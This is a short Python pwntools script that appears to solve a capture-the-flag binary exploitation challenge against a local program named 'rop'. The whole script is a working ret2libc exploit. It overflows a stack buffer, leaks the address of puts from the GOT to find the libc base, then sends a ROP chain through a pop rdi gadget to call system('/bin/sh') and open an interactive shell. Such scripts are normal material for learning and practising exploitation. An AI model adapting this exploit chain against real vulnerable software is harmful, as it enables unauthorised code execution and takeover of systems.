#encoding=utf-8
from pwn import *
import sys
context.log_level = 'debug'
context.arch='amd64'

p = process(["/tmp/ld-2.27.so", "./rop"], env={"LD_PRELOAD":"/tmp/libc-2.27.so"})
#p=process('./rop')
e = ELF('./rop')

context.terminal = ['tmux','splitw','-h', '-p', '50']
if(len(sys.argv) > 1):
    gdb.attach(p)
#libc = ELF('/lib/x86_64-linux-gnu/libc-2.28.so', checksec=False)
libc=ELF('/tmp/libc-2.27.so',checksec=False)
p.recvline()
r = ROP(e)
r.puts(e.got['puts'])
r.main()
#p.sendline(payload)
p.sendline(b'a'*0x28+r.chain())
leak = u64(p.recv(6).ljust(8,b'\x00'))
libc.address = leak-libc.symbols['puts']
print(hex(libc.address))

p.recvline()
payload = b'a'*0x28
addr_system = libc.symbols['system']
print(hex(addr_system-libc.address))
poprdi = libc.address + 0x2154d
binsh = next(libc.search(b'/bin/sh'))
payload += p64(poprdi) + p64(binsh)+p64(addr_system)+p64(0x40060b)
p.sendline(payload)
p.interactive()


